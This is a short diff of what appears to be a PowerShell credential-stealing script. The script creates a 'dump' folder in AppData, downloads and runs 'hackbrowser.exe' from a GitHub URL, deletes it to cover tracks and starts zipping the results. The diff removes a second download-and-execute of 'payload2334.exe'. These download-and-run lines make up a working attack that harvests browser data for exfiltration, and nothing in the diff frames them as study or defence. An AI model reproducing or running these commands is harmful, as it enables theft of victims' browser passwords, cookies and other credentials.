@@ -9,8 +9,6 @@ Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/BrunoBarrosEDT/chompis8/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
 ./hb.exe
-Invoke-WebRequest -Uri "https://github.com/shibachomp/CHOMP/raw/main/payload2334.exe" -OutFile "$env:appdata\dump\hb2.exe"
-./hb2.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
